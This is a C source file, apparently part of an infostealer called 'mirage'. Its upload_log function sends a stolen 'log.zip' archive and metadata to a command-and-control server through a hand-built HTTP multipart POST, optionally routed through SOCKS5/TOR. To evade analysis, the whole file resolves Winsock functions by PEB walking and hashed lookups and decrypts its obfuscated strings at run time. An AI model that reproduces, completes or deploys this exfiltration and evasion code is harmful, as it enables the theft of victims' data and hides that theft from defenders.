#include "panel_http.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"

#ifdef ENABLE_SOCKS5
#include "socks5.h"
#include "config.h"
#endif

/* ── PEB-walk API resolution (ws2_32.dll) ──────────────────── */

typedef int    (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
typedef int    (WSAAPI *pWSACleanup)(void);
typedef SOCKET (WSAAPI *psocket)(int, int, int);
typedef int    (WSAAPI *pconnect)(SOCKET, const struct sockaddr *, int);
typedef int    (WSAAPI *psend)(SOCKET, const char *, int, int);
typedef int    (WSAAPI *precv)(SOCKET, char *, int, int);
typedef int    (WSAAPI *pclosesocket)(SOCKET);
typedef u_short (WSAAPI *phtons)(u_short);
typedef unsigned long (WSAAPI *pinet_addr)(const char *);

static struct {
    pWSAStartup  pWSAStartup;
    pWSACleanup  pWSACleanup;
    psocket      psocket;
    pconnect     pconnect;
    psend        psend;
    precv        precv;
    pclosesocket pclosesocket;
    phtons       phtons;
    pinet_addr   pinet_addr;
    int          ready;
} g_ph_api;

static int ph_ensure_api(void) {
    if (g_ph_api.ready) return 1;

    char dll[32]; enc_decrypt(enc_ws2_32, ENC_WS2_32_LEN, dll);
    void *ws2 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!ws2) return 0;

    char fn[32];
    enc_decrypt(enc_WSAStartup, ENC_WSASTARTUP_LEN, fn);
    g_ph_api.pWSAStartup = (pWSAStartup)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_WSACleanup, ENC_WSACLEANUP_LEN, fn);
    g_ph_api.pWSACleanup = (pWSACleanup)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_socket, ENC_SOCKET_LEN, fn);
    g_ph_api.psocket = (psocket)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_connect, ENC_CONNECT_LEN, fn);
    g_ph_api.pconnect = (pconnect)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_send, ENC_SEND_LEN, fn);
    g_ph_api.psend = (psend)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_recv, ENC_RECV_LEN, fn);
    g_ph_api.precv = (precv)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_closesocket, ENC_CLOSESOCKET_LEN, fn);
    g_ph_api.pclosesocket = (pclosesocket)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_htons, ENC_HTONS_LEN, fn);
    g_ph_api.phtons = (phtons)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_inet_addr, ENC_INET_ADDR_LEN, fn);
    g_ph_api.pinet_addr = (pinet_addr)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));

    if (!g_ph_api.pWSAStartup || !g_ph_api.pWSACleanup || !g_ph_api.psocket ||
        !g_ph_api.pconnect || !g_ph_api.psend || !g_ph_api.precv ||
        !g_ph_api.pclosesocket || !g_ph_api.phtons || !g_ph_api.pinet_addr)
        return 0;

    g_ph_api.ready = 1;
    return 1;
}

static int ph_send_all(SOCKET sock, const void *data, size_t len) {
    const char *ptr = (const char *)data;
    while (len > 0) {
        int n = g_ph_api.psend(sock, ptr, (int)len, 0);
        if (n <= 0) return -1;
        ptr += n;
        len -= (size_t)n;
    }
    return 0;
}

int upload_log(const char *c2_host, unsigned short c2_port,
               const char *token, const unsigned char *archive_data,
               size_t archive_len, const char *metadata) {
    if (!ph_ensure_api()) return -1;

    WSADATA wsa;
    if (g_ph_api.pWSAStartup(MAKEWORD(2, 2), &wsa) != 0) return -1;

    SOCKET sock = INVALID_SOCKET;
#ifdef ENABLE_SOCKS5
    /* Route C2 traffic through the SOCKS5 proxy (TOR, etc.). */
    if (socks5_connect(SOCKS5_HOST, SOCKS5_PORT, c2_host, c2_port, &sock) != 0) {
        sock = INVALID_SOCKET;
    }
#endif

    if (sock == INVALID_SOCKET) {
        sock = g_ph_api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) { g_ph_api.pWSACleanup(); return -1; }

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = g_ph_api.phtons(c2_port);
        addr.sin_addr.s_addr = g_ph_api.pinet_addr(c2_host);

        if (g_ph_api.pconnect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            g_ph_api.pclosesocket(sock);
            g_ph_api.pWSACleanup();
            return -1;
        }
    }

    /* Decrypt boundary and endpoint from encrypted strings */
    char boundary[32];
    enc_decrypt(enc_boundary_mirage, ENC_BOUNDARY_MIRAGE_LEN, boundary);
    char api_path[16];
    enc_decrypt(enc_api_log, ENC_API_LOG_LEN, api_path);

    /* Build multipart request */
    char header[2048];
    if (archive_len > 0xE0000000ULL) {
        g_ph_api.pclosesocket(sock);
        g_ph_api.pWSACleanup();
        return -1;
    }
    int header_len = snprintf(header, sizeof(header),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "X-API-Key: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"archive\"; filename=\"log.zip\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        api_path, c2_host, token, boundary,
        archive_len + strlen(metadata) + 100, boundary);

    if (header_len <= 0 || (size_t)header_len >= sizeof(header)) {
        g_ph_api.pclosesocket(sock);
        g_ph_api.pWSACleanup();
        return -1;
    }

    /* Send header + archive + metadata + footer */
    int ok = 0;
    ok |= ph_send_all(sock, header, (size_t)header_len);
    ok |= ph_send_all(sock, archive_data, archive_len);

    char footer[256];
    int footer_len = snprintf(footer, sizeof(footer),
        "\r\n--%s\r\n"
        "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n"
        "%s\r\n"
        "--%s--\r\n",
        boundary, metadata, boundary);
    if (footer_len > 0 && (size_t)footer_len < sizeof(footer))
        ok |= ph_send_all(sock, footer, (size_t)footer_len);

    if (ok != 0) {
        g_ph_api.pclosesocket(sock);
        g_ph_api.pWSACleanup();
        return -1;
    }

    /* Read response (loop until close or buffer full) */
    char resp[4096];
    int total = 0;
    int n;
    while (total < (int)sizeof(resp) - 1) {
        n = g_ph_api.precv(sock, resp + total, (int)sizeof(resp) - 1 - total, 0);
        if (n <= 0) break;
        total += n;
    }
    resp[total] = '\0';

    g_ph_api.pclosesocket(sock);
    g_ph_api.pWSACleanup();

    /* Check for HTTP 200 — verify HTTP/1.x prefix first */
    if (total >= 12 && memcmp(resp, "HTTP/1.", 7) == 0 &&
        resp[9] == '2' && resp[10] == '0' && resp[11] == '0') {
        return 0;
    }
    return -1;
}
